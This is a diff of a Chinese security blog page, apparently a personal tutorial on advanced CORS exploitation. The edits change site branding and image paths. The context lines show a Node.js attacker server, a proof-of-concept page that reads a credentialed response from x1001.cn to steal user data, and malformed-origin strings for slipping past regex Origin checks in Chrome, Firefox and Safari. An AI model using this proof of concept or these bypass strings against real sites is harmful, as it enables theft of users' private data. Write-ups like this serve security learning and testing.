@@ -89,31 +89,31 @@
 
 
   <meta name="description" content="简介差不多有半年没写这些总结文章了，从现在开始恢复写。前些日子拜读了Corben Leo的Advanced CORS Exploitation Techniques，收获良多，想着有空复现一下cors漏洞的进阶利用。直入正题。 CORS介绍这里就借OWASP的关于CORS的介绍。  CORS stands for Cross-Origin Resource Sharing. Is an featu">
-<meta name="keywords" content="sec">
+<meta name="keywords" content="CORS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="cors的进阶利用">
-<meta property="og:url" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/index.html">
-<meta property="og:site_name" content="zii">
+<meta property="og:url" content="http://blog.x1001.cn/2019/07/17/cors的进阶利用/index.html">
+<meta property="og:site_name" content="x1001">
 <meta property="og:description" content="简介差不多有半年没写这些总结文章了，从现在开始恢复写。前些日子拜读了Corben Leo的Advanced CORS Exploitation Techniques，收获良多，想着有空复现一下cors漏洞的进阶利用。直入正题。 CORS介绍这里就借OWASP的关于CORS的介绍。  CORS stands for Cross-Origin Resource Sharing. Is an featu">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/cors.jpg">
-<meta property="og:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/corsproof.jpg">
-<meta property="og:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/cors2.png">
-<meta property="og:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/domainparse.jpg">
-<meta property="og:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/cors3.png">
-<meta property="og:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/cors4.jpg">
-<meta property="og:updated_time" content="2019-07-17T14:04:08.626Z">
+<meta property="og:image" content="http://blog.x1001.cn/img/cors.jpg">
+<meta property="og:image" content="http://blog.x1001.cn/img/corsproof.jpg">
+<meta property="og:image" content="http://blog.x1001.cn/img/cors2.png">
+<meta property="og:image" content="http://blog.x1001.cn/img/domainparse.jpg">
+<meta property="og:image" content="http://blog.x1001.cn/img/cors3.png">
+<meta property="og:image" content="http://blog.x1001.cn/img/cors4.jpg">
+<meta property="og:updated_time" content="2019-07-17T15:00:37.371Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="cors的进阶利用">
 <meta name="twitter:description" content="简介差不多有半年没写这些总结文章了，从现在开始恢复写。前些日子拜读了Corben Leo的Advanced CORS Exploitation Techniques，收获良多，想着有空复现一下cors漏洞的进阶利用。直入正题。 CORS介绍这里就借OWASP的关于CORS的介绍。  CORS stands for Cross-Origin Resource Sharing. Is an featu">
-<meta name="twitter:image" content="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/img/cors.jpg">
+<meta name="twitter:image" content="http://blog.x1001.cn/img/cors.jpg">
 
 
 
 
 
 
-  <link rel="canonical" href="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/">
+  <link rel="canonical" href="http://blog.x1001.cn/2019/07/17/cors的进阶利用/">
 
 
 
@@ -123,7 +123,7 @@
   };
 </script>
 
-  <title>cors的进阶利用 | zii</title>
+  <title>cors的进阶利用 | x1001</title>
   
 
 
@@ -182,7 +182,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zii</span>
+        <span class="site-title">x1001</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -339,16 +339,16 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.ghostz.com.cn/2019/07/17/cors的进阶利用/">
+    <link itemprop="mainEntityOfPage" href="http://blog.x1001.cn/2019/07/17/cors的进阶利用/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zii">
+      <meta itemprop="name" content="x1001">
       <meta itemprop="description" content="freedom and open world">
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zii">
+      <meta itemprop="name" content="x1001">
     </span>
 
     
@@ -382,7 +382,7 @@
                 
               
 
-              <time title="Created: 2019-07-17 22:02:21 / Modified: 22:04:08" itemprop="dateCreated datePublished" datetime="2019-07-17T22:02:21+08:00">2019-07-17</time>
+              <time title="Created: 2019-07-17 22:02:21 / Modified: 23:00:37" itemprop="dateCreated datePublished" datetime="2019-07-17T22:02:21+08:00">2019-07-17</time>
             
 
             
@@ -459,14 +459,14 @@
 <p>   <code>}</code></p>
 <p><code>}</code></p>
 <h1 id="初步利用"><a href="#初步利用" class="headerlink" title="初步利用"></a>初步利用</h1><p>初步测试，增加Origin头。发现返回包中出现<strong>Access-Control-Allow-Origin:[输入的origin]</strong>和<strong>Access-Control-Allow-Credentials: true</strong></p>
-<p><img src="./img/cors.jpg" alt=""></p>
+<p><img src="/img/cors.jpg" alt=""></p>
 <p>攻击者服务器端代码：</p>
 <p><em>Server.js</em></p>
 <p><code>var http = require(&#39;http&#39;);</code><br><code>var url  = require(&#39;url&#39;);</code><br><code>var fs   = require(&#39;fs&#39;);</code><br><code>var port = 9999</code></p>
 <p><code>http.createServer(function(req, res) {</code><br>    <code>if (req.url == &#39;/cors-poc&#39;) {</code><br>        <code>fs.readFile(&#39;cors.html&#39;, function(err, data) {</code><br>            <code>res.writeHead(200, {&#39;Content-Type&#39;:&#39;text/html&#39;});</code><br>            <code>res.write(data);</code><br>            <code>res.end();</code><br>        <code>});</code><br>    <code>} else {</code><br>        <code>res.writeHead(200, {&#39;Content-Type&#39;:&#39;text/html&#39;});</code><br>        <code>res.write(&#39;never gonna give you up...&#39;);</code><br>        <code>res.end();</code><br>    <code>}</code><br><code>}).listen(port, &#39;0.0.0.0&#39;);</code><br><code>console.log(Serving on port ${port});</code></p>
 <p><em>Cors.html</em><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function cors() &#123;</span></span><br><span class="line"><span class="undefined">  var xhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">  xhttp.onreadystatechange = function() &#123;</span></span><br><span class="line"><span class="undefined">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span></span><br><span class="line"><span class="undefined">      document.getElementById("pwnz").innerHTML = this.responseText;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="undefined">  xhttp.open("GET", "http://www.x1001.cn/cors.php", true);</span></span><br><span class="line"><span class="undefined">  xhttp.withCredentials = true;</span></span><br><span class="line"><span class="undefined">  xhttp.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"cors();"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">cors proof-of-concept:<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">cols</span>=<span class="string">"60"</span> <span class="attr">id</span>=<span class="string">"pwnz"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>浏览器访问<span class="exturl" data-url="aHR0cDovL2xvY2FsaG9zdDo5OTk5L2NvcnMtcG9j44CC56qD5Y+WeDEwMDEuY27kuK3nlKjmiLfkv6Hmga/jgII=" title="http://localhost:9999/cors-poc。窃取x1001.cn中用户信息。">http://localhost:9999/cors-poc。窃取x1001.cn中用户信息。<i class="fa fa-external-link"></i></span></p>
-<p><img src="./img/corsproof.jpg" alt=""></p>
+<p><img src="/img/corsproof.jpg" alt=""></p>
 <p>开发者代码示例：</p>
 <p><code>&lt;?php</code></p>
 <p><code>http_origin = &#39;&#39;;</code></p>
@@ -502,7 +502,7 @@
 </ol>
 <h1 id="高阶利用原理"><a href="#高阶利用原理" class="headerlink" title="高阶利用原理"></a>高阶利用原理</h1><p>在那篇文章中已经很详细的说明了这种方式利用的原理，这里在简要说明一下。</p>
 <p>我们已经知道开发者设置了正则表达式去校验Origin，首先想到是绕过这个正则表达式，上述表达式并没有限制特殊字符，比如!@#$%等等。我们可以通过构造类似如<strong>x10001.cn_.\<your-domain>/cors-poc</your-domain></strong>来绕过正则表达式。这将是一个突破口，接下来我们需要了解浏览器请求进行域名解析到获取到内容的过程，这就决定我们是否能通过这种形式获取受害者的数据。</p>
-<p><img src="./img/cors2.png" alt="image-20190717140008854"></p>
+<p><img src="/img/cors2.png" alt="image-20190717140008854"></p>
 <ul>
 <li><p>首先了解浏览器请求域名显示内容的过程</p>
 <ol>
@@ -514,19 +514,19 @@
 </ol>
 </li>
 <li><p>其次域名支持泛解析。所谓的泛解析是指：利用通配符*（星号）来做次级域名以实现所有的次级域名均指向同一IP地址。如图：</p>
-<p><img src="./img/domainparse.jpg" alt="域名的泛解析"></p>
+<p><img src="/img/domainparse.jpg" alt="域名的泛解析"></p>
 </li>
 <li><p>最后一点，浏览器要能够处理这些畸形的请求。不同的浏览器对不同的特殊字符有不同的响应的。基于那篇文章整理出一些主流的浏览器能够处理请求的特殊字符。</p>
 <ul>
 <li>Chrom&amp;Firefox      <strong>x1001.cn_.\<your domain="">/cors-poc</your></strong></li>
 </ul>
-<p><img src="./img/cors3.png" alt="image-20190717141619700"></p>
+<p><img src="/img/cors3.png" alt="image-20190717141619700"></p>
 <ul>
 <li>Safari          <strong>x1001.cn-_.<your domain\="">/cors-poc</your></strong></li>
 </ul>
 </li>
 </ul>
-<p><img src="./img/cors4.jpg" alt=""></p>
+<p><img src="/img/cors4.jpg" alt=""></p>
 <h1 id="Let’s-Hack"><a href="#Let’s-Hack" class="headerlink" title="Let’s Hack"></a>Let’s Hack</h1><ul>
 <li>需要一个域名，设置泛解析记录</li>
 <li>NodeJS</li>
@@ -556,6 +556,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CORS/" rel="tag"># CORS</a>
+          
+        </div>
       
 
       
@@ -622,7 +628,7 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
-              <p class="site-author-name" itemprop="name">zii</p>
+              <p class="site-author-name" itemprop="name">x1001</p>
               <p class="site-description motion-element" itemprop="description">freedom and open world</p>
           </div>
 
@@ -641,6 +647,19 @@
 
               
 
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
               
             </nav>
           
@@ -723,7 +742,7 @@
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">zii</span>
+  <span class="author" itemprop="copyrightHolder">x1001</span>
 
   
 
